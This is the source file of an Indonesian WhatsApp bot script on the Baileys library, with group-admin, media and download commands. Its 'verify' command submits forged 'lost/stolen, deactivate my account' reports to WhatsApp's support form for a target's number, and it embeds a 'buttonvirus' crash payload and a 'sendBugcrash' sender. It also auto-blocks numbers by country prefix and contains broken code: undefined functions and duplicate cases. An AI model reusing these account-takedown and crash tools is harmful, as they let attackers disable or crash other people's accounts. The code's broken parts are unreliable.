/*
CUMA NAMBAH DOANG
JIKA RENEME KASIH CREDIT LAHH!
JUAL SC INI? AUTO FULL ENC

BY 
LYNN
ZYY
PRII
*/


const { modul } = require('./module');
const { axios, baileys, chalk, cheerio, child_process, crypto, fs, ffmpeg, jsobfus, moment, ms, speed, util } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, reSize, generateProfilePicture } = require('./lib/myfunc')
const { buttonvirus } = require('./scrape/buttonvirus')
const os = require('os')
const { color, bgcolor } = require('./lib/color')
const { ytMp4, ytMp3, ytPlay } = require('./lib/yotube')
const { uptotelegra } = require('./scrape/upload')
const tiktok = require('./scrape/tiktok')
const audionye = fs.readFileSync('./y.mp3')
const owner = JSON.parse(fs.readFileSync('./database/owner.json').toString()) 
	
global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {},
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

global.ownerName = 'El Diablo'
global.ownerNumber = ["0@s.whatsapp.net"]
global.packname = 'Lynn'
global.author = '🗿'
global.prefa = ['','.']
global.mess = {
    wait: 'Tunggu Bwanhh!!',
    succes: 'Gimana Bwanh?',
    admin: 'Emang Lu Admin??',
    botAdmin: 'Bot Belum Admin Kocak',
    owner: 'Lu Siapa Kocak?',
    group: 'Khusus Grup bwanh',
    private: 'Khusus Privat bwanh',
    bot: 'Bot Number User Special Features!!!',
    error: 'Error Sis, Please Chat Owner...',
}
module.exports = diablo = async (diablo, m, chatUpdate, store) => {
try {
        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        const budy = (typeof m.text == 'string' ? m.text : '')
        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const content = JSON.stringify(m.message)
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const isCmd = body.startsWith(prefix)
        const from = m.key.remoteJid
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await diablo.decodeJid(diablo.user.id)
        const itsMediablo = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
		const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
		const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
        const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')  
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedMsg = (type == 'extendedTextMessage')
		const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
		const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
		const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
		const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
		const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false
        const hariRaya = new Date('January 1, 2023 00:00:00')
        const sekarang = new Date().getTime()
        const Selisih = hariRaya - sekarang
        const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
        const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const jmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60))
        const jdetik = Math.floor( Selisih % (1000 * 60) / 1000)
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
             const isGroup = m.chat.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await diablo.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {}
} catch (err) {
console.error(err)
}

if (!diablo.public) {
if (!m.key.fromMe) return
}

if (!m.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname))
}
if (m.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(m.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}

if (m.sender.startsWith('212')) return diablo.updateBlockStatus(m.sender, 'block')

if (global.db.chats[m.chat].antilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        m.reply(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
        if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)
        let gclink = (`https://chat.whatsapp.com/`+await diablo.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return m.reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
        if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
        if (itsMediablo) return m.reply(`Ehh maaf kamu owner bot ku`)
        diablo.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }

ppuser = 'https://raw.githubusercontent.com/JasRunJ/filenya/master/a4cab58929e036c18d659875d422244d.jpg'
ppnyauser = await reSize(ppuser, 200, 200)

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${buttonvirus}`, 
"jpegThumbnail": ppnyauser
}
}
}

if (command) {
diablo.sendPresenceUpdate('composing', from)
diablo.readMessages([m.key])
}

async function replyNya(teks) {
                       const buttonsDefault = [{ quickReplyButton: { displayText : `${buttonvirus}`, id : `.h` } }]                 
                       const buttonMessage = { 
                                    text: teks, 
                                    footer: "", 
                                    templateButtons: buttonsDefault, 
                                    image: {url: ppnyauser}                                   
                                               }
                       return diablo.sendMessage(from, buttonMessage)
                }

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        );
        const result = {
            status: 200,
            author: `diablo`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

const jimp_1 = require('jimp')
async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}

async function sendBugcrash(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {
listMessage: {
title: title,
description: description,
listType: 2,
productListInfo: {
productSections: [{
title: title,
products: produk
}],
headerImage: {
productId: productIdImg,
jpegThumbnail: thumbnail
},
businessOwnerJid: ownerBusines
},
footerText: footer,
}
}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : lep })
return diablo.relayMessage(progene.key.remoteJid, progene.message, {
messageId: ""
})
}
switch (command) {

case 'hentai-waifu' :
case 'nwaifu' :
if (!m.isGroup) return m.reply(mess.group)
if (!m.isGroup) return m.reply(mess.owner)
m.reply(mess.wait)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
 let nwaifubot = [
    {buttonId: `.hneko`, buttonText: {displayText: `Next ⚡`}, type: 1},
    ]
  let button4Messages = {
   image: {url:waifudd.data.url},
   caption:  `Ewe Mas🥵`,
  buttons: nwaifubot,
  headerType: 1
  }      
            await diablo.sendMessage(m.chat, button4Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'hentai-neko' :
case 'hneko' :
if (!m.isGroup) return m.reply(mess.group)
if (!m.isGroup) return m.reply(mess.owner)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 let hnekobot = [
    {buttonId: `.hneko`, buttonText: {displayText: `Next ⚡`}, type: 1},
    ]
  let button3Messages = {
   image: {url:waifudd.data.url},
   caption:  `Ewe Mas🥵`,
  buttons: hnekobot,
  headerType: 1
  }      
            await diablo.sendMessage(m.chat, button3Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'patrick':
case 'patricksticker': {
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/patrick')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await diablo.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await diablo.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'anjing':
case 'dog':
	case 'doge':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/doge')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await diablo.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
	case 'promote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await diablo.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
case 'demote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.mentionedJid ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await diablo.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
case 'kick': {
		if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await diablo.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'add': {
		if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await diablo.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
case 'store':
textsewa = `
     [ STORE LYNN ]
 ➤ NOKOS ALL NEGARA
 ➤ SEWABOT 2K / 1 BULAN
 ➤ ADDAKSES 2K / 1 BULAN
 ➤ SEWABOT + ADDAKSES 4K
 ➤ wa.me/6283890585717
    [ LYNN ] 

KENAPA MURAH?? KARNA SC INI
PUBLIC + FITUR PASARAN MAU SC??
CEK YT 
https://youtube.com/@xiee0

`
m.reply(textsewa)
break
            case 'out': {
                if (!itsMediablo) throw mess.owner
                await diablo.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
case 'waifu':
    case 'loli':
    case 'husbu':
    case 'milf':
    case 'cosplay':
    case 'wallml':
    m.reply(mess.wait)
          let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
          let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
          diablo.sendMessage(m.chat, { image: { url: wipi }, caption: `${command}` }, { quoted: m })
          
break
case'play': case 'ytplay': {
                if (!text) throw `Example : ${prefix + command} jedag jedug`
                let yts = require("yt-search")
                let search = await yts(text)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttonsZYK = [
                    {buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: 'Audio'}, type: 1},
                    {buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: 'Video'}, type: 1}
                ]
                let buttonMessageZYK = {
                    image: { url: anu.thumbnail },
                    caption: `
⭔ Title : ${anu.title}
⭔ Ext : Search
⭔ ID : ${anu.videoId}
⭔ Duration : ${anu.timestamp}
⭔ Viewers : ${anu.views}
⭔ Upload At : ${anu.ago}
⭔ Author : ${anu.author.name}
⭔ Channel : ${anu.author.url}
⭔ Description : ${anu.description}
⭔ Url : ${anu.url}`,
                    footer: `\nRuntime : ${runtime(process.uptime())}\nSILAHKAN PILIH BUTTONS DI BAWAH`,
                    buttons: buttonsZYK,
                    headerType: 1
                }
                diablo.sendMessage(m.chat, buttonMessageZYK, { quoted: m })
            }
            

            break
case 'verify':  {
            	if (!itsMediablo) return m.reply(mess.owner)
if (m.quoted || q) {
const froms = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')
var cekno = await diablo.onWhatsApp(froms)
if (cekno.length == 0) return m.reply(`Peserta tersebut sudah tidak terdaftar di WhatsApp`)
if (froms === ownerNumber) return m.reply(`Tidak bisa verif My Creator!`)
var targetnya = froms.split('@')[0]
try {
var axioss = require('axios')
var ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
var email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
var cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
var $ = cheerio.load(ntah.data)
var $form = $("form");
var url = new URL($form.attr("action"), "https://www.whatsapp.com").href
var form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

var res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
var payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`FROM WhatsApp Support
Hai,
 Terima kasih atas pesan Anda.
 Kami telah menonaktifkan akun WhatsApp Anda.  Ini berarti akun Anda untuk sementara dinonaktifkan dan akan dihapus secara otomatis dalam 30 hari jika Anda tidak mendaftarkan ulang akun tersebut.  Harap dicatat: Tim Dukungan Pelanggan WhatsApp tidak dapat menghapus akun Anda secara manual.
 Selama periode penonaktifan:
 • Kontak Anda di WhatsApp mungkin masih melihat nama dan gambar profil Anda. 
 • Setiap pesan yang mungkin dikirim oleh kontak Anda ke akun akan tetap dalam status tertunda hingga 30 hari.
 Jika Anda ingin mendapatkan kembali akun Anda, daftarkan ulang akun Anda sebagai secepatnya.  
 Daftar ulang akun Anda dengan memasukkan kode 6 digit, kode yang Anda terima melalui SMS atau panggilan telepon. Jika Anda mendaftar ulang
 pulihkan riwayat obrolan Anda di: Android |  iPhone.
 file, cadangan, atau riwayat panggilan dari akun yang dihapus.
 akun sebelum dihapus, Anda akan tetap berada di semua obrolan grup.  Anda akan memiliki opsi untuk memulihkan data Anda.  Pelajari caranya Jika Anda tidak mendaftarkan ulang akun Anda, akun tersebut mungkin akan dihapus dan proses ini tidak dapat dibatalkan.  Sayangnya, WhatsApp tidak dapat membantu Anda memulihkan obrolan, dokumen, media
 Catatan: Jika perangkat Anda hilang atau dicuri, sebaiknya hubungi penyedia seluler Anda untuk memblokir kartu SIM Anda sesegera mungkin.  Memblokir kartu SIM Anda mencegah orang lain mendaftar dan mengakses akun yang terkait dengan kartu SIM.
 Sumber daya terkait:
  Untuk informasi lebih lanjut tentang penonaktifan akun pada ponsel yang hilang dan dicuri, silakan baca artikel ini.
  Pelajari tentang akun yang dicuri di artikel ini.
 Jika Anda memiliki pertanyaan atau masalah lain, jangan ragu untuk menghubungi kami.  Kami akan dengan senang hati membantu!`)
} else if (payload.includes(`"payload":false`)) {
m.reply(`Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else m.reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else m.reply('Masukkan nomor target!')
}
break
case 'menfess':
			case 'menfes':
			case 'confes':
			case 'confess':
				if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				if (!text) return m.reply(`*Cara Penggunaan*\n\nKirim perintah ${prefix}${command} nomer|pengirim|pesan\n\nContoh ${prefix}${command} 62831xxxxxxx|ini nama samaran ya|I have a crush on you\n\nContoh 2 : ${prefix}${command} 62831xxxxxxx|crush mu|I have s crush on you\n\nTenang aja privasi aman kok><`)
				let nomor = q.split('|')[0] ? q.split('|')[0] : q
				let saking = q.split('|')[1] ? q.split('|')[1] : q
				let pesan = q.split('|')[2] ? q.split('|')[2] : ''
				if (pesan.length < 1) return m.reply(`Harus di isi semua! ex : menfess 62831xxxxxxxx|orang|hallo kamu`)
				 let teksnya = `Assalamualaikum kak ada Menfess nih!!\n─────────────\nLynn\n─────────────\n\nDari : _${saking}_ \nPesan : _${pesan}_ `
				header = 'hayyy'
					gambar = `https://telegra.ph/file/6f577f47b17f10fb463a1.jpg`

				 but = [
					{ urlButton: { displayText: `Subscribe YT`, url : `https://youtube.com/@xiee0` } },
                    { quickReplyButton: { displayText: `𝐓𝐞𝐫𝐢𝐦𝐚 𝐌𝐞𝐧𝐟𝐞𝐬𝐬`, id: `menfesconfirm ${m.sender}` } },
                    { quickReplyButton: { displayText: `𝐊𝐢𝐫𝐢𝐦 𝐌𝐞𝐧𝐟𝐞𝐬𝐬𝐦𝐮`, id: `Menfess` } }
                		]
					diablo.sendMessage(`${nomor}@s.whatsapp.net`, { caption: teksnya, image: {url: `https://telegra.ph/file/6f577f47b17f10fb463a1.jpg`}, templateButtons: but, footer: `Ciee ada yang ngirim pesan nih\nJangan lupa bales pesannya ya` })
				m.reply(`Sukses Mengirim Menfess!!`)
				break
            case 'self': {
                if (!itsMediablo) throw mess.owner
                diablo.public = false
                m.reply('BOT MODE SELEB🗿')
            }
            break
            case 'public': {
                if (!itsMediablo) throw mess.owner
                diablo.public = true
                m.reply('BOT MODE ANTI SELEB')
            }
            break
case 'ytlagu':
if (!text) throw `Example : ${prefix + command} Link Nya`
let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if (!isLinks2) return m.reply(`Linknya Jelek`)
m.reply(mess.wait)
anu = await ytMp3(`${q}`)
titlenyaa = `TITLE BERHASIL DI DAPATKAN\n\nJudul : ${anu.title}\nUpload : ${anu.uploadDate}\nSize : ${anu.size}\nViews : ${anu.views}\nLike : ${anu.likes}\nDislike : ${anu.dislike}\nChannel : ${anu.channel}\nDeskripsi : ${anu.desc}\n\nMOHON TUNGGU SEDANG MENGIRIM MEDIA`
diablo.sendMessage(m.chat, { image: { url: anu.thumb }, caption: `${titlenyaa}`}, { quoted: m })
diablo.sendMessage(m.chat, { audio: { url: anu.result }, mimetype: 'audio/mpeg', fileName: `${anu.title}.mp3` }, { quoted: m })
break
	    case 'ppcp': {
                m.reply(mess.wait)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                diablo.sendMessage(m.chat, { image: { url: random.male }, caption: `Cowoknya` }, { quoted: m })
                diablo.sendMessage(m.chat, { image: { url: random.female }, caption: `Ceweknya` }, { quoted: m })
            }
	    break
case 'sticker': case 's': case 'stickergif': case 'sgif': {
            if (!quoted) return m.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
            m.reply(mess.wait)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await diablo.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
                let media = await quoted.download()
                let encmedia = await diablo.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                m.reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
                }
            }
            break
case 'setppbot': {
                if (!itsMediablo) return m.reply(mess.owner)
                if (!quoted)return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                let media = await diablo.downloadAndSaveMediaMessage(quoted)
                await diablo.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(`Succes`)
                }
                break
case 'setppbot2': {
if (!itsMediablo) return reply(mess.owner)
if (!quoted) m.reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
let mediaa = await diablo.downloadAndSaveMediaMessage(quoted)
var { img } = await pepe(mediaa)
await diablo.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
 }
 ]
 })
m.reply(`Sukses`)
 }
break
case 'google': {
if (!text) throw `Example : ${prefix + command} fatih arridho`
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `• *Title* : ${g.title}\n`
teks += `• *Description* : ${g.snippet}\n`
teks += `• *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
m.reply(teks)
})
}
break
case 'play': case 'ytplay': {
if (!text) throw `Example : ${prefix + command} story wa anime`
let yts = require("yt-search")
let search = await yts(text)
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
let buttons = [
{buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: '♫ Audio'}, type: 1},
{buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: '► Video'}, type: 1}
]
let buttonMessage = {
image: { url: anu.thumbnail },
caption: `
• Title : ${anu.title}
• Ext : Search
• Id : ${anu.videoId}
🪀 Duration : ${anu.timestamp}
• Viewers : ${anu.views}
• Upload At : ${anu.ago}
• Author : ${anu.author.name}
• Channel : ${anu.author.url}
• Description : ${anu.description}
• Url : ${anu.url}`,
footer: diablo.user.name,
buttons: buttons,
headerType: 4
}
diablo.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break
case 'ytmp3':{

if (!text) return reply( `Example : ${prefix + command} https://youtube.com*****`)
if (!q.includes('youtu')) return reply(`Link Invalid!!`)
m.reply(mess.wait)
data = await caliph.downloader.youtube.ytmp4(q)
var nme = `./media/vid/${Date.now()}.mp4`
 fs.writeFileSync(nme, await getBuffer(data.result))
 var ran = './media/aud/'+getRandom('.mp3')
 exec(`ffmpeg -i ${nme} ${ran}`, async (err) => {
 diablo.sendMessage(m.chat, { audio: fs.readFileSync(ran), mimetype: 'audio/mp4', fileName: `${data.title}.mp3` }, { quoted: m })
fs.unlinkSync(nme)
fs.unlinkSync(ran)
 })
 confirmlimit(sender, 1)
}
break
case 'ytmp4':
case 'ytvideo':{

if (!text) return reply( `Example : ${prefix + command} https://youtube.com*****`)
if (!q.includes('youtu')) return reply(`Link Invalid!!`)
m.reply(mess.wait)
data = await caliph.downloader.youtube.ytmp4(q)
diablo.sendMessage(m.chat, { video: await getBuffer(data.result), caption: data.title }, { quoted: m })
confirmlimit(sender, 1)
}
break



  case 'gimage2': {
 	if (!text) throw `Example : ${prefix + command} query`
m.reply(mess.wait)
let gis = require('g-i-s')
gis(text, async (error, result) => {
let n = result
let images = n[Math.floor(Math.random() * n.length)].url
let buttons = [
    {buttonId: `.gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
    image: { url: images },
    caption: `* GIMAGE SEARCH 」*
 *Query* : ${text}
 *Media Url* : ${images}`,
    footer: ` © ${setting.botName} bot`,
    buttons: buttons,
    headerType: 4
}
diablo.sendMessage(m.chat, buttonMessage, { quoted: m })
})
}
           break

            case 'pinterest2': {
               
          
             
             
             
            	if (!text) throw `Example : ${prefix + command} text`
m.reply(mess.wait)         
         
		let { pinterest } = require('./lib/scraper')
                
anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [
    {buttonId: `.pinterest ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
    image: { url: result },
    caption: `* PINTEREST SEARCH 」*
 *Query* : ${text}
 *Media Url* : ${result}`,
    footer: ` © ${setting.botName} bot`,
    buttons: buttons,
    headerType: 4
}
diablo.sendMessage(m.chat, buttonMessage, { quoted: m })}
            




break
case 'tiktok':
 if(!text) return m.reply(`Linknya?`)
 anu = await fetchJson(`https://api.yanzbotzz.repl.co/api/download/tiktok?url=${text}&apikey=YanzBotz`)
 diablo.sendMessage(m.chat, { video: { url: anu.result.video.no_watermark }, mimetype: 'video/mp4', fileName: `${anu.title}.mp4` }, { quoted: m })
 break
case 'sticker': case 's': case 'stickergif': case 'sgif': {
            if (!quoted) return m.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
            m.reply(mess.wait)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await hisoka.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
                let media = await quoted.download()
                let encmedia = await diablo.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                m.reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
                }
            }
            
            break
case 'ytmp4hd':
if (!text) throw `Example : ${prefix + command} Link Nya`
